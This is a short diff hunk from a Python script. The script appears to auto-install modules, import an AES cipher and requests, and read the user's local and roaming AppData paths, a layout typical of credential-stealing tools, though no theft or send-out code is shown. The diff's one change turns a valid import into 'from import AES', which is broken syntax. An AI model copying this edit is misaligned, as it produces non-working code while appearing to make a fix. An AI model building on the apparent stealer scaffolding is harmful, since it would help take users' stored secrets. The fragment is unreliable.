@@ -246,7 +246,7 @@ for modl in requirements:
         time.sleep(3)
 
 import requests
-from Crypto.Cipher import AES
+from import AES
 
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
